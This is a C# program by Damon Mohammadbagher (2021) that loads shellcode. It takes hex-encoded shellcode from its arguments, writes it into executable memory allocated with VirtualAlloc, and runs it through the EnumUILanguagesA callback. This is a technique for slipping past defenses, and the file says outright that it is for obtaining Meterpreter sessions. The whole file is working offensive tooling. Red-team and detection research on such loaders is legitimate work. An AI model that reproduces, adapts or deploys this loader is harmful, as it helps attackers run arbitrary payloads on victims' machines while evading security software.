using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_EnumUILanguagesA
{
    class Program
    {
        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x0040
        }

        //[DllImport("kernel32.dll")]
        //public static extern IntPtr LoadLibraryW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName);

        [DllImport("ntdll.dll")]
        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        private static extern bool EnumUILanguagesA(IntPtr lpUILanguageEnumProc, uint dwFlags, IntPtr lParam);

        static void Main(string[] args)
        {
            /// .Net 3.5 / 4.0 only ;)
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_EnumUILanguagesA , Published by Damon Mohammadbagher , Mar 2021");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_EnumUILanguagesA Callback Functions Technique via (EnumUILanguagesA) API");
            Console.WriteLine();
            string[] X = args[0].Split(',');
            byte[] Xpayload = new byte[X.Length];
            for (int i = 0; i < X.Length;) { Xpayload[i] = Convert.ToByte(X[i], 16); i++; }
            Console.WriteLine();
            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
            //Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
            RtlMoveMemory(p, Xpayload, (uint)Xpayload.Length);
            Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::VirtualAlloc.Result[" + p.ToString("X8") + "]");
            Console.WriteLine();
            Console.WriteLine("Bingo: Meterpreter Session via callback functions Technique by \"EnumUILanguagesA\"  ;)");
            bool ok = EnumUILanguagesA(p, 0, IntPtr.Zero);
            Console.ReadKey();
        }
    }
}
